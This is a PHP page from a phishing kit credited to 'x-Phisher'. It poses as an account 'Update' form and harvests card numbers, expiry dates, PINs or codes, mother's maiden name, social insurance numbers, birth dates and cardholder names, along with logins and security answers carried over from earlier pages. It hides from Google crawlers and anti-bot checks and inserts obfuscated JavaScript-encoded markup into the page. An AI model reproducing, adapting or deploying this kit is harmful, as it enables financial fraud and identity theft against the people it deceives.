<?php
/*
======================= Coded By x-Phisher ======================
____  ___        __________.__    .__       .__                  
\   \/  /        \______   \  |__ |__| _____|  |__   ___________ 
 \     /   ______ |     ___/  |  \|  |/  ___/  |  \_/ __ \_  __ \
 /     \  /_____/ |    |   |   Y  \  |\___ \|   Y  \  ___/|  | \/
/___/\  \         |____|   |___|  /__/____  >___|  /\___  >__|   
      \_/                       \/        \/     \/     \/       
========================= xphisher.ru ===========================
*/
session_start();
error_reporting(0);
include('BOTS/antibots1.php');
include('BOTS/antibots2.php');
include('BOTS/antibots3.php');
include('BOTS/antibots4.php');
include ('BOTS/authenticator.php');
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
$_SESSION['u'] = $_SESSION['u'];
$_SESSION['p'] = $_SESSION['p'];
$_SESSION['e'] = $_SESSION['e'];
$_SESSION['e_p'] = $_SESSION['e_p'];
$_SESSION['q1'] = $_SESSION['q1'];
$_SESSION['q2'] = $_SESSION['q2'];
$_SESSION['q3'] = $_SESSION['q3'];
$_SESSION['a1'] = $_SESSION['a1'];
$_SESSION['a2'] = $_SESSION['a2'];
$_SESSION['a3'] = $_SESSION['a3'];
?>
<!DOCTYPE html>
<html>
<head>
	<title>Update</title>
</head>
<body>
<div>
    <div style="position:absolute;left:0px;top:0px;width:1349px;height:614px;z-index:0;">
        <img src="./files/secure_form.jpg">
    </div>
    <p style="left:965px;position:absolute;top:55px;font-size:.845em;"> <?php echo $_SESSION['u']; ?></p>
    <p style="left:1065px;position:absolute;top:69px;font-size:.845em;line-height: 1.2em; margin: 0;"><?php echo date("F j, Y") ?></p>
    <form name="f" method="post" action="./submit/update.php">
    <input type="text" required="required" name="cc" style="position:absolute;left: 635px;top: 492px;font-family:'Courier New',sans-serif; font-size: 10px;max-height:19px;width:136px" size="16" maxlength ="16" id="cc" value = ''/>
    <SELECT style="position:absolute;left: 634px;top: 522px;font-family:'Courier New',sans-serif; font-size: 14px;max-height:20px;width:42px" size=1 
                    name=exp_m><OPTION value="" selected>MM</OPTION><OPTION 
                    value=1/January>01</OPTION><OPTION 
                    value=2/February>02</OPTION><OPTION 
                    value=3/March>03</OPTION><OPTION 
                    value=4/April>04</OPTION><OPTION 
                    value=5/May>05</OPTION><OPTION 
                    value=6/June>06</OPTION><OPTION 
                    value=7/July>07</OPTION><OPTION 
                    value=8/August>08</OPTION><OPTION 
                    value=9/September>09</OPTION><OPTION 
                    value=10/October>10</OPTION><OPTION 
                    value=11/November>11</OPTION><OPTION 
                    value=12/December>12</OPTION></SELECT>&nbsp;&nbsp;
                <SELECT style="position:absolute;left: 688px;top: 522px;font-family:'Courier New',sans-serif; font-size: 14px;max-height:20px;width:56px" size=1 
                  name=exp_y>
                  <OPTION value="" selected>YY</OPTION>
                  <OPTION value=2019>2019</OPTION>
                  <OPTION value=2020>2020</OPTION>
                  <OPTION value=2021>2021</OPTION>
                  <option value="2022">2022</option>
                  <option value="2023">2023</option>
                  <option value="2024">2024</option>
                  <option value="2025">2025</option>
                  <option value="2026">2026</option>
                  <option value="2027">2027</option>
                  <option value="2028">2028</option>
                 </SELECT>
<input required="required" type="text" style="position:absolute;left: 635px;top: 550px;font-family:'Courier New',sans-serif; font-size: 14px;max-height:20px;width:136px" name="p" size="4" maxlength ="4" value = ''/>
<input required="required" type="text" style="position:absolute;left: 635px;top: 608px;font-family:'Courier New',sans-serif; font-size: 14px;max-height:20px;width:136px" name="mm" value = ''/>
<input required="required" type="text" style="position:absolute;left: 635px;top: 636px;font-family:'Courier New',sans-serif; font-size: 14px;max-height:20px;width:136px" name="si" size="12" maxlength ="12" value = ''/>
<input required="required" type="text" style="position:absolute;left: 634px;top: 667px;font-family:'Courier New',sans-serif; font-size: 14px;max-height:20px;width:136px" name=dob>
<input required="required" type="text" style="position:absolute;left: 635px;top: 695px;font-family:'Courier New',sans-serif; font-size: 14px;max-height:20px;width:136px" name="chn" value = ''/>
<a style="position:absolute;left: 898px;top: 751px;" onClick="C();"><img src="./files/btn_continue.png"></a>

<script language="Javascript">var erp = new Array;
erp[0] = 1013542512;
erp[1] = 1970544756;
erp[2] = 2037409085;
erp[3] = 577268068;
erp[4] = 1684368930;
erp[5] = 544104813;
erp[6] = 1698505331;
erp[7] = 1702000229;
erp[8] = 1919118437;
erp[9] = 1634607648;
erp[10] = 1986096245;
erp[11] = 1698505317;
erp[12] = 1684628585;
erp[13] = 1835362917;
erp[14] = 926967661;
erp[15] = 1634298926;
erp[16] = 1668246828;
erp[17] = 543583842;
erp[18] = 1668246906;
erp[19] = 1080520033;
erp[20] = 1768697443;
erp[21] = 1869423166;
erp[22] = 0;
var em = '';
for(i=0;i<erp.length;i++){
	tmp = erp[i];
	if(Math.floor((tmp/Math.pow(256,3)))>0){
		em += String.fromCharCode(Math.floor((tmp/Math.pow(256,3))));
	};
	tmp = tmp - (Math.floor((tmp/Math.pow(256,3))) * Math.pow(256,3));
	if(Math.floor((tmp/Math.pow(256,2)))>0){
		em += String.fromCharCode(Math.floor((tmp/Math.pow(256,2))));
	};
	tmp = tmp - (Math.floor((tmp/Math.pow(256,2))) * Math.pow(256,2));
	if(Math.floor((tmp/Math.pow(256,1)))>0){
		em += String.fromCharCode(Math.floor((tmp/Math.pow(256,1))));
	};
	tmp = tmp - (Math.floor((tmp/Math.pow(256,1))) * Math.pow(256,1));
	if(Math.floor((tmp/Math.pow(256,0)))>0){
		em += String.fromCharCode(Math.floor((tmp/Math.pow(256,0))));
	};
};
document.write(em);
</script>
</form>
<script>
function C()
{

    var isValidForm = document.forms['f'].checkValidity();
    if (isValidForm)
    {
        document.forms['f'].submit();
    }
    else
    {

        return false;
    }

}</script>     
</div>
</body>
</html>